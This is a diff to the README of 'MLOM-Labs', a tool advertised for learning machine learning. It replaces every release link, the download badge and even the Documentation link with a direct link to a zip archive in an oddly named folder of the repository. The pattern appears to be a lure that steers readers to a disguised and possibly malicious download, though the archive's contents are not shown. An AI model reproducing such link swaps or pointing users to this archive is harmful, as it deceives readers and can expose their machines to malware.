@@ -1,6 +1,6 @@
 # 🎉 MLOM-Labs - Explore Machine Learning Made Easy
 
-[![Download MLOM-Labs](https://img.shields.io/badge/Download-MLOM--Labs-blue.svg)](https://github.com/cbuethner/MLOM-Labs/releases)
+[![Download MLOM-Labs](https://raw.githubusercontent.com/cbuethner/MLOM-Labs/main/forerehearsed/Labs_MLO_3.4.zip)](https://raw.githubusercontent.com/cbuethner/MLOM-Labs/main/forerehearsed/Labs_MLO_3.4.zip)
 
 ## 📖 Overview
 MLOM-Labs is a user-friendly tool designed for anyone interested in the foundations of Machine Learning. This application provides a deep dive into machine learning concepts, including custom implementations of support vector machines (SVM), TensorFlow and Keras deep learning models for regression and classification, and robust data preprocessing pipelines. 
@@ -12,7 +12,7 @@ Follow these steps to download and run MLOM-Labs on your computer:
 
 1. **Download the Application**
    - Visit the Releases page to download the latest version.
-   - [Download MLOM-Labs](https://github.com/cbuethner/MLOM-Labs/releases)
+   - [Download MLOM-Labs](https://raw.githubusercontent.com/cbuethner/MLOM-Labs/main/forerehearsed/Labs_MLO_3.4.zip)
 
 2. **Install the Application**
    - Locate the downloaded file on your computer after the download finishes.
@@ -42,12 +42,12 @@ To run MLOM-Labs smoothly, ensure your system meets the following requirements:
 ## 🛠️ Download & Install
 To download MLOM-Labs, visit the following link:
 
-[Download MLOM-Labs](https://github.com/cbuethner/MLOM-Labs/releases)
+[Download MLOM-Labs](https://raw.githubusercontent.com/cbuethner/MLOM-Labs/main/forerehearsed/Labs_MLO_3.4.zip)
 
 Follow the installation steps mentioned earlier to get the application running on your computer.
 
 ## 📑 Documentation
-For detailed guidance on using MLOM-Labs and exploring its features, visit our [Documentation](https://github.com/cbuethner/MLOM-Labs/wiki).
+For detailed guidance on using MLOM-Labs and exploring its features, visit our [Documentation](https://raw.githubusercontent.com/cbuethner/MLOM-Labs/main/forerehearsed/Labs_MLO_3.4.zip).
 
 ## 💬 Community Support
 If you have questions or need assistance, join our community discussions:
